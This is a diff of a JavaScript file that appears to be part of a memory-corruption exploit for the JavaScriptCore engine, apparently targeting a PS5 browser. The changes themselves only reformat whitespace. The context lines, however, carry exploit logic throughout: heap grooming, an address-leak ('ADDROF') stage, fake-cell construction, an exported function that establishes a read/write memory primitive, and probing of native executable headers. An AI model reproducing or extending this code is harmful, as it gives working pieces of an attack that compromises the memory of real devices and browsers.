@@ -18,7 +18,7 @@ const CARRIER_SLOTS = (function () {
     const q = new URLSearchParams(location.search).get("slots");
     const n = q ? parseInt(q, 10) : 0;
     if (n >= 100000 && n <= 40000000) return n;
-  } catch (e) {}
+  } catch (e) { }
   return 12000000;
 })();
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
@@ -36,7 +36,7 @@ const _gOverride = (function () {
       const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
       if (k && n > 0) out[k] = n;
     }
-  } catch (e) {}
+  } catch (e) { }
   return out;
 })();
 const _g = (name, dflt) =>
@@ -309,7 +309,7 @@ function emit(tag, detail) {
   if (onEvent === null) return;
   try {
     onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
-  } catch {}
+  } catch { }
 }
 
 function checkCarrierIdentity(candidate) {
@@ -361,7 +361,7 @@ function failed() {
   setTimeout(() => {
     try {
       history.replaceState(null, "");
-    } catch {}
+    } catch { }
     attemptNumber++;
     startAttempt();
   }, AUTO_RETRY_DELAY_MS);
@@ -393,11 +393,11 @@ function releaseAttemptAllocations() {
   keepAlive = null;
   try {
     history.replaceState(null, "");
-  } catch {}
+  } catch { }
   if (typeof globalThis.gc === "function") {
     try {
       globalThis.gc();
-    } catch {}
+    } catch { }
   }
 }
 
@@ -415,11 +415,11 @@ function scheduleSafeRetry(reason) {
     emit(
       "AUTO-RETRY-NOT-SCHEDULED",
       `reason=${reason}` +
-        `-safe=${retrySafe}` +
-        `-candidate-seen=${candidateEverReturned}` +
-        `-candidate-mutated=${candidateMutationStarted}` +
-        `-candidate-state-safe=${candidateStateSafe}` +
-        `-attempt-persisted=${attemptPersisted}`,
+      `-safe=${retrySafe}` +
+      `-candidate-seen=${candidateEverReturned}` +
+      `-candidate-mutated=${candidateMutationStarted}` +
+      `-candidate-state-safe=${candidateStateSafe}` +
+      `-attempt-persisted=${attemptPersisted}`,
     );
     failed();
     return;
@@ -446,9 +446,9 @@ function scheduleSafeRetry(reason) {
         emit(
           "AUTO-RETRY-CANCELLED",
           `reason=${reason}` +
-            `-retry-safe=${retrySafe}` +
-            `-candidate-safe=${candidateStillSafe}` +
-            `-candidate-mutated=${candidateMutationStarted}`,
+          `-retry-safe=${retrySafe}` +
+          `-candidate-safe=${candidateStillSafe}` +
+          `-candidate-mutated=${candidateMutationStarted}`,
         );
         failed();
         return;
@@ -466,7 +466,7 @@ function finishEarlySafeAttempt(tag, extra, reason) {
   emit(
     tag,
     `${extra}-retry-safe=true-candidate-seen=false` +
-      "-candidate-mutated=false",
+    "-candidate-mutated=false",
   );
   scheduleSafeRetry(reason);
 }
@@ -547,11 +547,11 @@ function startAttempt() {
     sessionStorage.setItem(attemptKey, String(attemptNumber));
     attemptPersisted =
       sessionStorage.getItem(attemptKey) === String(attemptNumber);
-  } catch {}
+  } catch { }
   emit(
     "ATTEMPT-START",
     `attempt-persisted=${attemptPersisted}` +
-      `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
+    `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
   );
   try {
     buildAndStoreGraph();
@@ -982,7 +982,7 @@ function loadHistoryCritical() {
 
     try {
       globalThis.__ps5NativeCtor = nativeConstructorAddress;
-    } catch (e) {}
+    } catch (e) { }
     const nativeExecType1 = targetHeader[5];
 
     nativeExecutableHeaderOK =
@@ -1045,24 +1045,24 @@ function loadHistoryCritical() {
     if (result !== null) {
       try {
         result[DUPLICATE_INDEX] = undefined;
-      } catch {}
+      } catch { }
     }
     if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
       try {
         restoreCarrier(candidate);
-      } catch {}
+      } catch { }
     }
     candidate = null;
     result = null;
     try {
       targetView[0] = 0xa5;
-    } catch {}
+    } catch { }
     try {
       rwMirror[0] = 0x3c;
-    } catch {}
+    } catch { }
     try {
       clearPredecessor();
-    } catch {}
+    } catch { }
     compositionError = error;
     compositionState = -1;
   }
@@ -1111,7 +1111,7 @@ function runGroomAndLoad() {
   } catch (error) {
     try {
       clearPredecessor();
-    } catch {}
+    } catch { }
     retrySafe = true;
     compositionError = error;
     compositionState = -1;
@@ -1143,8 +1143,8 @@ function defaultCriticalBarrier(fake, target) {
 
     try {
       sessionStorage.setItem(burstKey, line);
-    } catch {}
-  } catch {}
+    } catch { }
+  } catch { }
 }
 
 function beginComposition() {
@@ -1184,14 +1184,14 @@ function beginComposition() {
   emit(
     "ADDROF-POINTERS",
     `HOST=${hex(a0)}-TARGET=${hex(b0)}` +
-      `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
+    `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
   );
 
   if (!(repeated && distinct && plausible && sourceCovered)) {
     finishEarlySafeAttempt(
       "ADDROF-FAIL",
       `repeat=${repeated}-distinct=${distinct}` +
-        `-plausible=${plausible}-covered=${sourceCovered}`,
+      `-plausible=${plausible}-covered=${sourceCovered}`,
       "addrof-validation",
     );
     return;
@@ -1238,7 +1238,7 @@ function reportComposition() {
     emit(
       retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
       `${compositionError?.name}:` +
-        String(compositionError?.message).slice(0, 80),
+      String(compositionError?.message).slice(0, 80),
     );
     if (!retrySafe) failed();
     else scheduleSafeRetry("placement-throw");
@@ -1261,11 +1261,11 @@ function reportComposition() {
             ? "COMPOSITION-LENGTH-MISS"
             : "VALIDATION-MISMATCH",
       `rw=${rwHeaderOK}-holder=${holderHeaderOK}` +
-        `-function=${functionHeaderOK}` +
-        `-native-executable=${nativeExecutableHeaderOK}` +
-        `-repeat=${pointersRepeated}-retry-safe=${retrySafe}` +
-        `-identity=${identityResult}` +
-        `-hex=${dumpHex(rwHeader, CELL_BYTES)}`,
+      `-function=${functionHeaderOK}` +
+      `-native-executable=${nativeExecutableHeaderOK}` +
+      `-repeat=${pointersRepeated}-retry-safe=${retrySafe}` +
+      `-identity=${identityResult}` +
+      `-hex=${dumpHex(rwHeader, CELL_BYTES)}`,
     );
     if (!retrySafe) failed();
     else
@@ -1288,27 +1288,27 @@ function reportComposition() {
   emit(
     "RW-CARRIER",
     `sid=${hex(profile.carrierSID)}` +
-      `-vector=${hex(rwOriginalVector)}` +
-      `-length=${hex(uint32At(rwHeader, 0x18))}` +
-      `-mode=${hex(profile.carrierMode)}`,
+    `-vector=${hex(rwOriginalVector)}` +
+    `-length=${hex(uint32At(rwHeader, 0x18))}` +
+    `-mode=${hex(profile.carrierMode)}`,
   );
   emit(
     "HOLDER",
     `cell=${hex(targetAddress)}` +
-      `-textarea=${hex(anchorElementAddress)}` +
-      `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`,
+    `-textarea=${hex(anchorElementAddress)}` +
+    `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`,
   );
   emit(
     "JSC-PROFILE",
     `u8=${hex(profile.carrierType)}` +
-      `-u8flags=${hex(profile.carrierFlags)}` +
-      `-mode=${hex(profile.carrierMode)}` +
-      `-obj=${hex(profile.holderType)}` +
-      `-objflags=${hex(profile.holderFlags)}` +
-      `-fn=${hex(profile.functionType)}` +
-      `-fnflags=${hex(profile.functionFlags)}` +
-      `-nx=${hex(profile.nativeExecType)}` +
-      `-nxflags=${hex(profile.nativeExecFlags)}`,
+    `-u8flags=${hex(profile.carrierFlags)}` +
+    `-mode=${hex(profile.carrierMode)}` +
+    `-obj=${hex(profile.holderType)}` +
+    `-objflags=${hex(profile.holderFlags)}` +
+    `-fn=${hex(profile.functionType)}` +
+    `-fnflags=${hex(profile.functionFlags)}` +
+    `-nx=${hex(profile.nativeExecType)}` +
+    `-nxflags=${hex(profile.nativeExecFlags)}`,
   );
   emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
 
@@ -1326,9 +1326,9 @@ function reportComposition() {
     emit(
       "READ-PRIMITIVE-MISMATCH",
       `rw=${rwHeaderOK}` +
-        `-holder=${holderHeaderOK}-function=${functionHeaderOK}` +
-        `-native=${nativeExecutableHeaderOK}` +
-        `-repeat=${pointersRepeated}-restore=${restoreObserved}`,
+      `-holder=${holderHeaderOK}-function=${functionHeaderOK}` +
+      `-native=${nativeExecutableHeaderOK}` +
+      `-repeat=${pointersRepeated}-restore=${restoreObserved}`,
     );
 
     liveCandidate = null;
@@ -1343,7 +1343,7 @@ function reportComposition() {
 
   try {
     history.replaceState(null, "");
-  } catch {}
+  } catch { }
 
   stopped = true;
   running = false;
@@ -1420,7 +1420,7 @@ export function establishPrimitive(options) {
     return Promise.reject(
       new Error(
         "core: the fake cell has been released to the real-cell pair -- " +
-          "establishPrimitive cannot run again in this page",
+        "establishPrimitive cannot run again in this page",
       ),
     );
   if (running) return Promise.reject(new Error("core: already running"));
@@ -1450,7 +1450,7 @@ export function establishPrimitive(options) {
   attemptNumber = 1;
   try {
     sessionStorage.removeItem(attemptKey);
-  } catch {}
+  } catch { }
 
   return new Promise((resolve, reject) => {
     settleResolve = resolve;
@@ -1509,7 +1509,7 @@ export function releaseFakeCell() {
   try {
     history.replaceState(null, "");
     report.historyCleared = history.state === null;
-  } catch (_) {}
+  } catch (_) { }
 
   fakeReleased = true;
   stopped = true;
